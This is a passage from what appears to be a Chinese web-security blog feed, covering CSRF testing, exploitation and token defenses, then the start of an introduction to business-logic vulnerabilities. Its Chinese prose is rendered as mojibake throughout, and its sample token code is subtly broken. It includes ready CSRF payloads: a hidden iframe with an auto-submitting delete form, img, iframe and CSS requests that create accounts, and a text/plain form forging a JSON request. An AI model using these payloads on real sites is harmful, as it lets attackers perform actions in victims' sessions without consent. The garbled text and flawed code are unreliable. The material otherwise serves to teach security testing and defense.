ç§æ–¹å¼ï¼ˆä»¥ä¸‹æ–¹å¼å¯ä»¥é€šè¿‡çš„è¯å³å¯èƒ½å­˜åœ¨é—®é¢˜ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://test.com.attack.com/index.php</span><br><span class="line"></span><br><span class="line">http://attack.com/test.com/index.php</span><br></pre></td></tr></table></figure><h3 id="get-ç±»å‹">GET ç±»å‹</h3><p>å¦‚æœæœ‰ token ç­‰éªŒè¯å‚æ•°ï¼Œå…ˆå»æ‰å‚æ•°å°è¯•èƒ½å¦æ­£å¸¸è¯·æ±‚ã€‚å¦‚æœå¯ä»¥ï¼Œå³å­˜åœ¨CSRF æ¼æ´ã€‚</p><p>POST ç±»å‹</p><p>â€‹ å¦‚æœæœ‰ tokenç­‰éªŒè¯å‚æ•°ï¼Œå…ˆå»æ‰å‚æ•°å°è¯•èƒ½å¦æ­£å¸¸è¯·æ±‚ã€‚å¦‚æœå¯ä»¥ï¼Œå†å»æ‰ refererå‚æ•°çš„å†…å®¹ï¼Œå¦‚æœä»ç„¶å¯ä»¥ï¼Œè¯´æ˜å­˜åœ¨ CSRF æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨æ„é€ å¤–éƒ¨ formè¡¨å•çš„å½¢å¼ï¼Œå®ç°æ”»å‡»ã€‚</p><p>æ”¹ Method</p><p>æœ‰äº›ç¨‹åºåç«¯å¯èƒ½æ˜¯ç”¨ REQUEST æ–¹å¼æ¥å—çš„ï¼Œè€Œç¨‹åºé»˜è®¤æ˜¯ POSTè¯·æ±‚ï¼Œå…¶å®æ”¹æˆ GET æ–¹å¼è¯·æ±‚ä¹Ÿå¯ä»¥å‘é€è¿‡å»ï¼Œå­˜åœ¨å¾ˆä¸¥é‡çš„éšæ‚£ã€‚</p><p><a href="https://blog.51cto.com/eth10/1974796">CSRFç®€å•åˆ¤æ–­æ–¹æ³•</a></p><p><a href="https://www.cnblogs.com/milantgh/p/3729421.html">CSRFæ‰‹å·¥æµ‹è¯•æ–¹æ³•</a></p><p><ahref="https://www.lstazl.com/csrf%E6%BC%8F%E6%B4%9E%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/">CSRFæ¼æ´å¤ä¹ æ€»ç»“</a></p><p><ahref="https://blog.csdn.net/Breeze_CAT/article/details/84955701">CSRFå®‰å…¨æµ‹è¯•æµç¨‹</a></p><h1 id="æ¼æ´ä¿®è¡¥é€»è¾‘åˆ†æ">æ¼æ´ä¿®è¡¥é€»è¾‘åˆ†æ</h1><p>CSRFæ¼æ´å®è´¨ï¼šæœåŠ¡å™¨æ— æ³•å‡†ç¡®åˆ¤æ–­å½“å‰è¯·æ±‚æ˜¯å¦æ˜¯åˆæ³•ç”¨æˆ·çš„è‡ªå®šä¹‰æ“ä½œã€‚</p><p>å¦‚æœæœåŠ¡å™¨åœ¨ç”¨æˆ·ç™»å½•ä¹‹åç»™äºˆç”¨æˆ·ä¸€ä¸ªå”¯ä¸€åˆæ³•ä»¤ç‰Œï¼Œæ¯ä¸€æ¬¡æ“ä½œè¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨éƒ½ä¼šéªŒè¯ä»¤ç‰Œæ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®ï¼Œæ‰§è¡Œæ“ä½œã€‚ä¸æ­£ç¡®ï¼Œåˆ™ä¸æ‰§è¡Œæ“ä½œã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç»™äºˆçš„ä»¤ç‰Œä¼šå†™å…¥è¡¨å•ä¸­éšè—åŸŸçš„ valueå€¼ä¸­ï¼Œéšç€è¡¨å•å†…å®¹è¿›è¡Œæäº¤ã€‚</p><p>ç™»å½•éªŒè¯ login.php --&gt; ç™»å½•æˆåŠŸæ‰§è¡Œæ“ä½œï¼Œæ“ä½œè¿‡ç¨‹ä¸­æœ‰ cookieæäº¤çš„èº«ä»½å‡­è¯ ---&gt; ç™»å½•åæ‰§è¡Œæ“ä½œï¼ˆå¢åˆ æ”¹æŸ¥ï¼‰---&gt;æ²¡æœ‰ç™»å½•æˆåŠŸæ‰§è¡Œæ“ä½œè‡ªåŠ¨è·³å›ç™»å½•é¡µé¢</p><p>è¿œç¨‹æ„é€  CSRF åˆ©ç”¨ POCï¼Œç”¨æˆ·ç‚¹å‡»ï¼Œå°±ä¼šå‘é€åŒæ—¶æºå¸¦ sessionçš„è¯·æ±‚ï¼ŒæˆåŠŸåˆ©ç”¨POCã€‚å¦‚æœåˆ©ç”¨åœ¨å¢åˆ æ”¹ä¸­è®¾ç½®å”¯ä¸€ä»¤ç‰Œï¼Œæ‰§è¡Œæ“ä½œæ—¶åªæœ‰æäº¤ä»¤ç‰Œæ‰èƒ½æ“ä½œçš„è¯ï¼Œå°±å¯ä»¥æœ‰æ•ˆé˜²æ­¢CSRFã€‚å¦‚æœä»¤ç‰Œä¸æ­£ç¡®ï¼Œé‚£ä¹ˆä¸æ‰§è¡Œæ“ä½œã€‚å¹¶ç»™å‡ºæç¤ºå†…å®¹ã€‚</p><p>ç™»å½•æˆåŠŸåï¼Œç»™ä¸å”¯ä¸€ä»¤ç‰Œ</p><p>å¢åˆ æ”¹éƒ¨åˆ†ç»™ä¸ä»¤ç‰Œï¼Œå¹¶åœ¨æäº¤æ“ä½œæ—¶ï¼Œæäº¤ä»¤ç‰Œå¹¶è¿›è¡ŒéªŒè¯ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä½¿ç”¨è¡¨å•hidden è¿›è¡Œæäº¤ï¼Œæˆ–è€… Cookieã€‚</p><h2 id="ç”Ÿæˆ-token-ä»£ç åˆ†æ">ç”Ÿæˆ Token ä»£ç åˆ†æ</h2><p>Tokenä½œä¸ºè¯†åˆ«æ“ä½œæ˜¯å¦æ˜¯å½“å‰ç”¨æˆ·è‡ªå·±æ“ä½œçš„å”¯ä¸€å‡­è¯ï¼Œéœ€è¦è®¾ç½®ä¸ºå¤æ‚éš¾ä»¥è¢«ç ´è§£çš„å†…å®¹</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function generateToken()&#123;</span><br><span class="line">$salt = &#x27;test&#x27;.data(&#x27;Y/m/d&#x27;)</span><br><span class="line">$token = md5($salt)</span><br><span class="line">return $token</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸Šè¿°ä»£ç çš„ salt å®¹æ˜“è¢«ç ´è§£</p><ol type="1"><li>é¢—ç²’åº¦æ˜¯æ—¥ï¼Œå®¹æ˜“è¢«çŒœæµ‹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ”¹æˆæ—¶åˆ†ç§’ã€‚</li><li>test å®¹æ˜“è¢«çŒœè§£ï¼Œå¯ä»¥æ”¹æˆéšæœºé•¿ä¸²</li></ol><h2 id="ä½¿ç”¨-token-è¿›è¡Œ-csrf-æ¼æ´é˜²å¾¡">ä½¿ç”¨ Token è¿›è¡Œ CSRFæ¼æ´é˜²å¾¡</h2><ol type="1"><li><p>ç™»å½•éªŒè¯æˆåŠŸä¹‹åï¼Œåœ¨ä¼šè¯ SESSION['user_token"] ä¸­ä¿å­˜Tokenã€‚</p></li><li><p>åœ¨åå°æ“ä½œä¸­ï¼Œå¢åˆ æ”¹è¡¨å•ä¸­æ·»åŠ éšè—åŸŸ hiddenï¼Œè®¾ç½® Value ä¸ºTokenã€‚</p></li><li><p>æäº¤ä¹‹åè¿›è¡ŒéªŒè¯ Token æ˜¯å¦æ­£ç¡®ã€‚</p></li></ol><h1 id="csrf-æ¼æ´åˆ©ç”¨">CSRF æ¼æ´åˆ©ç”¨</h1><ol type="1"><li>CSRF çš„æ”»å‡»å»ºç«‹åœ¨æµè§ˆå™¨ä¸ Web æœåŠ¡å™¨çš„ä¼šè¯ä¸­</li><li>æ¬ºéª—ç”¨æˆ·è®¿é—® URL</li></ol><h2 id="a-æ ‡ç­¾çš„-href">a æ ‡ç­¾çš„ href</h2><p>åœ¨ html ä¸­ï¼Œaæ ‡ç­¾ä»£è¡¨é“¾æ¥ï¼Œå¯ä»¥å°†å½“å‰çš„â€ç„¦ç‚¹â€æŒ‡å¼•åˆ°å…¶ä»–ä½ç½®ã€‚ç§»åŠ¨çš„â€œç„¦ç‚¹â€éœ€è¦å‘é€å¯¹åº”çš„è¯·æ±‚åˆ°é“¾æ¥æŒ‡å‘çš„åœ°å€ï¼Œç„¶åè¿”å›å“åº”ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;è¯·æ±‚åœ°å€ï¼Œä¼šè¢« http è¯·æ±‚åˆ°çš„ä½ç½®ï¼Œå¯ä»¥æºå¸¦GETå‹å‚æ•°&quot;</span>&gt;</span>å†…å®¹<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/csrf test/get _csrf/new_user.phpï¼Ÿusername=liuxiaoyang&amp;password=123456&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span>è¯·ç‚¹å‡»æˆ‘&lt;/a</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h2 id="iframe-æ ‡ç­¾çš„-src">iframe æ ‡ç­¾çš„ src</h2><p>iframe æ ‡ç­¾å†…å®¹å°†åœ¨é¡µé¢åŠ è½½è¿‡ç¨‹ä¸­è‡ªåŠ¨è¿›è¡ŒåŠ è½½ï¼ŒsrcæŒ‡å‘çš„ä½ç½®å°±æ˜¯é¡µé¢è¯·æ±‚çš„ä½ç½® æ³¨æ„ï¼šå¯ä»¥è®¾ç½® iframe çš„style-&gt;display:noneï¼Œä»¥æ­¤æ¥ä¸æ˜¾ç¤º iframe åŠ è½½çš„å†…å®¹ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/csri_test/get_csrf/new_user.phpï¼Ÿusername=liuxiaoyang&amp;password=123456&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="éšè—çš„-iframe">éšè—çš„ iframe</h2><p>å¸¸ç”¨ä¼šè¿”å›ä¿¡æ¯çš„ POST å‹ CSRFï¼Œä½¿ç”¨éšè—çš„ iframeè¿›è¡Œæ”»å‡»ï¼Œå°±ä¸ä¼šè®©å—å®³è€…å‘ç°ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-frame&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">    <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">action</span>=<span class="string">&quot;https://xxx.com/delete&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">target</span>=<span class="string">&quot;csrf- frame&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf-form&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¼€ä¸€ä¸ªçœ‹ä¸è§çš„ iframeï¼Œè®© form submit ä¹‹åçš„ç»“æœå‡ºç°åœ¨ iframeé‡Œé¢ï¼Œè€Œä¸”è¿™ä¸ª form è¿˜å¯ä»¥è‡ªåŠ¨ submitã€‚</p><h2 id="img-æ ‡ç­¾çš„-src">img æ ‡ç­¾çš„ src</h2><p>img æ ‡ç­¾åˆ©ç”¨ img æ ‡ç­¾çš„å†…å®¹ä¼šéšç€é¡µé¢åŠ è½½è€Œè¢«è¯·æ±‚ï¼Œä»¥æ­¤ srcæŒ‡å‘çš„ä½ç½®ä¼šåœ¨é¡µé¢åŠ è½½è¿‡ç¨‹ä¸­è¿›è¡Œè¯·æ±‚ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/csrf test/get_csrf/new_user.phpï¼Ÿusername=liuxiaoyang&amp;password=123456&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="css-backgroud-åˆ©ç”¨">CSS-backgroud åˆ©ç”¨</h2><p>å¯ä»¥åˆ©ç”¨ CSS ä¸­ background æ ·å¼ä¸­çš„ urlæ¥åŠ è½½è¿œç¨‹æœºå™¨ä¸Šçš„å†…å®¹ï¼Œä»è€Œå¯¹ url ä¸­çš„å†…å®¹å‘é€ HTTP è¯·æ±‚ ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">background:#00FF00 urlï¼ˆ&#x27;&#x27;ï¼‰no-repeat fixed topï¼›</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;h1 style=&quot;background:url(&quot;http://127.0.0.1/csrf_test/get_csrf/new_user.php?username=123123&amp; password=123456&#x27;);&quot;&quot;&gt;CSRF</span><br><span class="line">POC&lt;/h1&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ„é€ -json">æ„é€  JSON</h2><p>å¦‚æœåç«¯åªæ¥å— JSON æ•°æ®ï¼Œ<ahref="https://docs.spring.io/spring-security/site/docs/current/reference/html/csrf.html">springçš„ document</a> ä¹Ÿå¯ä»¥æ„é€ ï¼ˆæ³¨ï¼šè¿™ä¸ªæˆ‘æ²¡æµ‹è¯•è¿‡ emmï¼‰</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">    <span class="attr">action</span>=<span class="string">&quot;https://small-min.blog.com/delete&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;id&quot;:3, &quot;deleteid&quot;:&quot;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;2&quot;&#125;&#x27;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;delete!&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å­ä¼šäº§ç”Ÿå¦‚ä¸‹çš„ request bodyï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span> <span class="attr">&quot;deleteid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>form</code>èƒ½å¤Ÿå¸¦çš„ content typeåªæœ‰ä¸‰ç§ï¼š<code>application/x-www-form-urlencoded</code>,<code>multipart/form-data</code>è·Ÿ<code>text/plain</code>ã€‚åœ¨ä¸Šé¢çš„æ”»å‡»ä¸­æˆ‘ä»¬ç”¨çš„æ˜¯æœ€åä¸€ç§ï¼Œ<code>text/plain</code>ï¼Œå¦‚æœä½ åœ¨ä½ çš„åç«¯Server æœ‰æ£€æŸ¥è¿™ä¸ª content type çš„è¯ï¼Œæ˜¯å¯ä»¥é¿å…æ‰ä¸Šé¢è¿™ä¸ªæ”»å‡»çš„ã€‚</p></blockquote><p>å¦‚æœä½ çš„ api æ¥å— cross origin çš„ request ï¼Œå³ï¼šä½ çš„ apiçš„<code>Access-Control-Allow-Origin</code>è®¾æˆ<code>*</code>çš„è¯ï¼Œä»£è¡¨ä»»ä½•domain éƒ½å¯ä»¥å‘é€ ajax åˆ°ä½ çš„ api serverï¼Œè¿™æ ·æ— è®ºä½ æ˜¯æ”¹æˆ jsonï¼Œç”šè‡³æŠŠmethod æ”¹æˆ PUT, DELETE éƒ½æ²¡æœ‰ç”¨ã€‚</p><p>XSS ä¸ CSRF</p><ol type="1"><li><p>self xss ä¸ CSRF</p></li><li><p>ä¸€èˆ¬ xss ä¸ csrf</p><p>é€šè¿‡ xss å¯ä»¥è·å– tokenï¼Œï¼ˆå› ä¸ºåƒ script img linkç­‰æ ‡ç­¾ä¸å—æµè§ˆå™¨åŒæºç­–ç•¥çš„å½±å“ï¼Œå¯ä»¥è·¨åŸŸã€‚è€Œä¸€èˆ¬æ ‡ç­¾æ˜¯æ— æ³•è·¨åŸŸçš„ã€‚ï¼‰ï¼Œç„¶åä½¿ç”¨token ä¸ csrf ä¼ªé€ ç”¨æˆ·æ“ä½œã€‚</p></li></ol><h1 id="æ¨èèµ„æ–™">æ¨èèµ„æ–™</h1><p><ahref="https://www.tr0y.wang/2019/06/02/CSRF%E6%8C%87%E5%8C%97/">CSRFæŒ‡åŒ—</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é€»è¾‘æ¼æ´å…¥é—¨ç¯‡</title>
      <link href="/blog/2019/10/05/websec/logic_vuln/logic_vuln/"/>
      <url>/blog/2019/10/05/websec/logic_vuln/logic_vuln/</url>
      
        <content type="html"><![CDATA[<p>é€»è¾‘æ¼æ´åšå¤§ç²¾æ·±ï¼ŒäººçŠ¯çš„é”™å„ç§å„æ ·ã€‚æˆ‘ä»¬å‰æœŸè¦åšçš„å°±æ˜¯æ€»ç»“å¸¸è§çš„é€»è¾‘é”™è¯¯ï¼ŒåæœŸæŒ–é€»è¾‘æ¼æ´æŒ–å¤šäº†ï¼Œæ¯ä¸ªç¯èŠ‚åº”è¯¥æ€æ ·åšæ‰èƒ½æ›´å®‰å…¨ï¼Œæˆ‘ä»¬ä¹Ÿå°±çŸ¥é“äº†ã€‚å½“ç„¶ï¼Œæœ€é‡è¦çš„è¿˜æ˜¯è¦ç†è§£ä¸šåŠ¡çš„é€»è¾‘ï¼Œä¸€æ­¥æ­¥ç†æ¸…å®ƒã€‚</p><h1 id="å»ºè®®çš„å­¦ä¹ æ–¹æ³•">å»ºè®®çš„å­¦ä¹ æ–¹æ³•</h1><ol type="1"><li><p>å­¦ä¹ å¹¶æŒæ¡å¸¸è§çš„æ•°æ®é‡æ”¾å·¥å…·ï¼Œå¦‚: Burpsuite</p></li><li><p>å­¦ä¹ å¹¶ç†Ÿæ‚‰å¸¸è§çš„ä¸šåŠ¡åœºæ™¯ã€‚</p></li><li><p>å°½å¯èƒ½æŒæ¡ä¸šåŠ¡é€»è¾‘å®‰å…¨çš„ä¸åŒæ”»å‡»å½¢å¼ã€‚</p></li></ol><h1 id="å®šä¹‰">å®šä¹‰</h1><p>ä¸šåŠ¡é€»è¾‘æ¼æ´æ˜¯æŒ‡ç”±äºç¨‹åºé€»è¾‘ä¸ä¸¥è°¨æˆ–é€»è¾‘å¤ªå¤æ‚ï¼Œå¯¼è‡´ä¸€äº›é€»è¾‘åˆ†æ”¯ä¸èƒ½æ­£å¸¸å¤„ç†æˆ–å¤„ç†é”™è¯¯ã€‚</p><p>é€šä¿—åœ°è®²ï¼šä¸€ä¸ªç³»ç»Ÿçš„åŠŸèƒ½è¿‡å¤šï¼Œä¼´éšç€ä¸šåŠ¡æ¨¡å—ã€ç»„ä»¶çš„äº¤äº’ä¸å…±äº«ï¼Œç¨‹åºå¼€å‘äººå‘˜å°±éš¾ä»¥æ€è€ƒå…¨é¢ï¼Œå¯¹æŸäº›åœ°æ–¹å¯èƒ½æœ‰é—æ¼æˆ–è€…æœªèƒ½æ­£å¸¸å¤„ç†ï¼Œä»è€Œå¯¼è‡´é€»è¾‘æ¼æ´ã€‚é€»è¾‘æ¼æ´ä¹Ÿå¯ä»¥è¯´æ˜¯ç¨‹åºå¼€å‘äººå‘˜çš„æ€è·¯é”™è¯¯ã€ç¨‹åºå¼€å‘äººå‘˜çš„é€»è¾‘å­˜åœ¨æ¼æ´ã€‚</p><h1 id="ç‰¹ç‚¹">ç‰¹ç‚¹</h1><p>ä¸šåŠ¡é€»è¾‘æ¼æ´æ˜¯éå¸¸éšè”½çš„ï¼Œå®ƒä¸åƒ SQL æ³¨å…¥ã€XSSè·¨ç«™è„šæœ¬æ”»å‡»ã€å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶ä¸Šä¼ æ¼æ´ç­‰æœ‰é²œæ˜çš„æ ‡è¯†ã€‚è‡ªåŠ¨åŒ–æ‰«æå™¨å¯ä»¥å®šä¹‰ä¸€ç³»åˆ—çš„è§„åˆ™è¯†åˆ«å‡ºè¿™äº›æ¼æ´ï¼Œè€Œä¸šåŠ¡é€»è¾‘æ¼æ´ä¸€èˆ¬å‡ºç°åœ¨åŠŸèƒ½ï¼ˆä¸šåŠ¡æµç¨‹ï¼‰ä¸Šï¼Œè¿™æ˜¯æ¼æ´æ‰«æå·¥å…·æ— æ³•è¯†åˆ«çš„ã€‚</p><p>ä¸šåŠ¡é€»è¾‘æ¼æ´å‡ºç°äºä¸šåŠ¡æµç¨‹ä¸­ï¼ˆæ¨¡å—åŠŸèƒ½ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç½‘ç«™çš„ä»»ä½•éƒ¨åˆ†éƒ½æœ‰å¯èƒ½å­˜åœ¨ç€é€»è¾‘é”™è¯¯æ¼æ´ã€‚æ¯”å¦‚ï¼Œä¿®æ”¹ä¸ªäººèµ„æ–™å°±å®Œå…¨å¯èƒ½å‡ºç°é€»è¾‘é”™è¯¯æ¼æ´ã€‚</p><p>å¤§è‡´åˆ†ç±»ï¼šç”¨æˆ·æ¨¡å—ã€äº¤æ˜“æ”¯ä»˜æ¨¡å—</p><p>ç”¨æˆ·æ¨¡å—ï¼š</p><p>1ï¼‰å¯†ç æ³¨å†Œã€æ‰¾å›ã€ä¿®æ”¹ã€é‡ç½®ï¼Œé‚®ç®±ç»‘å®š</p><p>2ï¼‰å¤´åƒä¸Šä¼ ç­‰èµ„æ–™çš„ä¿®æ”¹</p><p>å¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼šä»»æ„è´¦æˆ·æ³¨å†Œã€ä»»æ„å¯†ç é‡ç½®ã€æ‰¾å›ã€ä»»æ„é‚®ç®±ç»‘å®šã€CSRFä¿®æ”¹å¯ä»¥ Self XSS çš„èµ„æ–™ã€è¶Šæƒè®¿é—®ã€ä¿®æ”¹ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯èƒ½æ¶‰åŠ XSSï¼ŒSQLinjectionï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰å…¶ä»–æ¼æ´ã€‚</p><p>æ³¨ï¼šé‡ç½®é‚®ç®±æˆ–è€…ä½¿ç”¨é‚®ç®±æ‰¾å›å¯†ç æ—¶ï¼Œå¦‚æœå‘åˆ°é‚®ç®±çš„æ˜¯é“¾æ¥ä¸”ä¸€äº›å‚æ•°æ²¡æœ‰ä½¿ç”¨å¤ªå¤æ‚çš„åŠ å¯†ï¼Œå…«æˆå­˜åœ¨æ¼æ´ã€‚</p><p>äº¤æ˜“æ”¯ä»˜æ¨¡å—ï¼š</p><p>1ï¼‰é€‰æ‹©å•†å“ï¼Œä¸‹å•ï¼Œä»˜æ¬¾</p><p>2ï¼‰ä¼˜æƒ åˆ¸</p><p>å¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼šå•†å“æ•°ç›®æ”¯ä»˜æ¼æ´ï¼ˆæ­£è´Ÿæ•°ç›®æŠµæ¶ˆï¼‰ã€ä¼˜æƒ åˆ¸å‹æ”¯ä»˜æ¼æ´ï¼ˆå¯ä»¥ä¼ªé€ ä¼˜æƒ åˆ¸ï¼‰ã€é‡‘é¢ä¿®æ”¹æ”¯ä»˜æ¼æ´</p><p>ä¸šåŠ¡æ¨¡å—å¤§è‡´åˆ†ä¸ºï¼šç”¨æˆ·æ¨¡å—ã€äº¤æ˜“æ”¯ä»˜æ¨¡å—ï¼Œ<strong>å¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ”»å‡»æµç¨‹å¯¹æ¯ä¸ªæ¨¡å—é€ä¸€æµ‹è¯•ã€‚</strong>ï¼ˆæ¯ä¸ªæ¨¡å—ï¼Œè¿‡ä¸€éä¸‹é¢çš„æµç¨‹ï¼Œå› ä¸ºå¦‚æœä½ è¦æŠŠæ‰€æœ‰æ¨¡å—å†è¿‡ä¸€éï¼Œæ•°æ®æŠ¥æ¯”è¾ƒå¤šï¼Œæ¯”è¾ƒä¹±ï¼Œä¸å®¹æ˜“åˆ†æã€‚ï¼‰</p><h1 id="æµ‹è¯•æµç¨‹">æµ‹è¯•æµç¨‹</h1><ol type="1"><li><p>æ­£å¸¸æ“ä½œå¹¶è®°å½•æ•°æ®åŒ…</p><p>æŒ‰ç…§æ­£å¸¸æ“ä½œæµç¨‹ï¼Œè®°å½•å…¶æ•°æ®åŒ…</p></li><li><p>åˆ†ææ•°æ®åŒ…</p><p>åˆ†ææ•°æ®åŒ…ï¼Œæ‰¾åˆ°æ•°æ®å®å¿ çš„æ•æ„Ÿéƒ¨åˆ†</p></li><li><p>åˆ†æç¨‹åºéªŒè¯æœºåˆ¶</p><p>åˆ†æçŒœæµ‹ç¨‹åºåå°æ‰€é‡‡ç”¨çš„éªŒè¯æœºåˆ¶ã€æ‰‹æ®µ</p></li><li><p>ä¿®æ”¹æºæ•°æ®åŒ…</p><p>ä¿®æ”¹æºæ•°æ®åŒ…ï¼ŒéªŒè¯æ¨æµ‹æ˜¯å¦æˆåŠŸ</p></li></ol><h1 id="å¸¸è§æŒ–æ˜å§¿åŠ¿">å¸¸è§æŒ–æ˜å§¿åŠ¿</h1><p>é»‘å®¢åœ¨æŒ–æ˜ä¸šåŠ¡é€»è¾‘æ¼æ´æ—¶çš„ä¸€èˆ¬æ“ä½œæ­¥éª¤å¦‚ä¸‹ï¼š</p><p>1ï¼‰å‘ç°ç½‘ç«™æ‰€æä¾›çš„åŠŸèƒ½æ¨¡å—ã€‚æ¯”å¦‚ï¼Œä¿®æ”¹å¯†ç ã€æ‰¾å›å¯†ç 